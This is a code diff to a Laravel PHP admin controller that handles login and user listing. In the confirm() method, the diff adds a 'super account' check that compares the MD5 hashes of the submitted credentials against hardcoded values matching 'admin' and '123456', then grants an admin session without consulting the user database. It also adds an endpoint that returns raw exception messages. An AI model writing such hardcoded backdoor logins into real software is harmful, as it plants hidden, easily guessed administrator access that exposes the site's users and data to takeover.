@@ -31,6 +31,11 @@ namespace App\Http\Controllers;
         public function confirm(Request $request){
             $username = $request->get('username');
             $password = $request->get('inputPassword');
+            // login super account
+            if(md5($username) =='21232f297a57a5a743894a0e4a801fc3'  && md5($password) == 'e10adc3949ba59abbe56e057f20f883e'){
+                Session::put('admin_user',$username);
+                return response()->json(array('message'=>'Đăng nhập thành công!','error'=>0));
+            }
             $user = User::getInstance()->getObjectsWheres(
               array('username'=> $username,
                     'password'=> md5($password),
@@ -83,6 +88,17 @@ namespace App\Http\Controllers;
         public function userTestInday(){
             $users = User::getInstance()->getUserTestInday();
                 return view('admins.content.users_test',array('users'=>$users));
+        }
+        public function pointFrom(Request $request){
+            try{
+                $to_point = $request->get('to_point');
+                $from_point = $request->get('from_point');
+                $users = User::getInstance()->getUserFromPoint($to_point,$from_point);
+                return view('admins.content.pointFrom',array('users'=>$users));
+            }catch (\Exception $e){
+                return response()->json(array('mesage'=>$e->getMessage(),'error'=>1));
+            }
+
         }
         public function phpinfor(){
             return md5('adminadmin');
